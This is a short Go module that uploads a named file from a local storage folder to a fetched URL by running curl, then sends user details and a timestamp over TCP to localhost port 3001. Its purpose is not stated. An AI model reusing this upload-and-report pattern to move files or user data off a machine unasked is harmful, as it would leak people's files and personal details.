package modules

import (
    "fmt"
    "os/exec"
    "path/filepath"
    "net"
    "log"
)



func Sendfiles(filename string) {
    uploadURL := Getaddress()
    
    // DEBUG: Print the URL being used
    fmt.Printf("DEBUG - Upload URL: %s\n", uploadURL)
    
    fullPath := filepath.Join("storage", filename)
    fmt.Printf("DEBUG - Full file path: %s\n", fullPath)
    
    // Build the curl command as a string for debugging
    cmdStr := fmt.Sprintf("curl -F file=@%s %s", fullPath, uploadURL)
    fmt.Printf("DEBUG - Curl command: %s\n", cmdStr)
    
    cmd := exec.Command("curl", "-F", "file=@"+fullPath, uploadURL)
    output, err := cmd.CombinedOutput()
    
    fmt.Printf("DEBUG - Curl output: %s\n", string(output))
    
    if err != nil {
        fmt.Printf("Error uploading %s: %v\n", filename, err)
    } else {
        fmt.Printf("Successfully uploaded %s\n", filename)
    }

    Sendlogs()
}

func Sendlogs(){
   

    conn, err := net.Dial("tcp", "127.0.0.1:3001")
if err != nil {
    log.Println("Connection failed:", err)
    return
}
defer conn.Close()

_, err = conn.Write([]byte(userdetails() + "\t" + Timestamp()))
if err != nil {
    log.Println("Write failed:", err)
    return
} 

}